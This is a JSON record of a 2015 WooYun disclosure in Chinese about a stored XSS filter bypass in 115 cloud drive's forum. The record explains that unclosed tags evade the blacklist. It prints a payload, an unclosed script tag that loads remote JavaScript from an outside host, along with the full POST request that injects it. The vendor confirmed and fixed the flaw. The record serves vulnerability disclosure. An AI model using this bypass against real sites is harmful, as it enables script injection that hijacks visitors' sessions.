{"id": 39345, "wybug_id": "wooyun-2015-094265", "wybug_title": "115网盘存储型xss过滤再一次强势绕过", "wybug_corp": "115网盘", "wybug_author": "Mr .LZH", "wybug_date": "2015-01-28 12:06", "wybug_open_date": "2015-02-04 12:07", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-04：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 115网盘存储型xss过滤再一次强势绕过。我自己都惊呆了。 详细说明：  之前提交的漏洞： WooYun: 115网盘存储型xss过滤强势绕过  已经修复。测试了一下，修复内容大致为：(1).过滤了所有js事件。(2).删除了html编辑功能。(3).过滤了部分html标签。例如：<input>修复(1)(3)加大了绕过难度，而(2)则是毫无用处的，因为最终编辑后是发生数据包到服务器，可直接编辑数据包实现编辑html。好了，回归正题。此次漏洞的导致原因是标签过滤逻辑错误导致的。如果提交<script>则匹配后被过滤，但提交如<script 则不被过滤。于是猜想：如果标签未闭合，则不过滤，而遇到新的 < 号，则以此开始重新匹配后面是否是黑名单标签。于是构造如下的payload，成功绕过过滤。<p>xss <script SRC=\"http://ha.ckers.org/xss.js\" xss< p>post请求为：\nPOST /133130/post/save Host: q.115.comgid=133130&allow_notice=1&fids=&pickcodes=&category=&anonymous=0&allow_cates=&allow_uids=&pid=1468345&tid=128761&validate=qrea&offer_reward=0&fb_price=10&addition=&subject=aa%C2%A0aa&content=%3Cp%3Eabbb<script SRC=\"http://ha.ckers.org/xss.js\"  bbbbbbaa%3C%2Fp%3E&\n结果如图：\n\n又是绕了一晚上，累啊。。。。。   漏洞证明：     修复方案：     版权声明：转载请注明来源 Mr .LZH@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：17  确认时间：2015-01-28 14:18 厂商回复： 感谢提交，辛苦了！ 最新状态： 2015-02-04：   ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 17, "Ranks": null}